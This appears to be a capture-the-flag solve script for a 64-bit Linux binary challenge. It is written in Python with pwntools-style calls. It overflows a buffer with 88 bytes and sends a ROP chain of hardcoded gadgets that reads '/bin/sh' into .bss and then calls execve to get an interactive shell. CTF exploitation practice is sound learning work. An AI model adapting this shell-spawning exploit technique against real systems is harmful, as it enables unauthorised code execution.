from kk import *
context(arch='amd64', os='linux', log_level='debug')
#context.terminal = ['wt.exe', 'wsl.exe', '-d', 'Ubuntu', '-e', 'bash', '-c']

p = process("./pwn")
#p = remote("pwn.challenge.ctf.show", 28128)

pop_rax = 0x46b9f8
pop_rdi = 0x00000000004016c3
pop_rsi = 0x00000000004017d7
pop_rdx = 0x00000000004377d5
syscall = 0x000000000045bac5
bss = 0x00000000006C3C20

p.recvuntil("where is my system_x64?")
payload = b"A"*88 + p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(0x100) + p64(syscall)
payload += p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)
p.sendline(payload)
p.send(b'/bin/sh\x00')

p.interactive()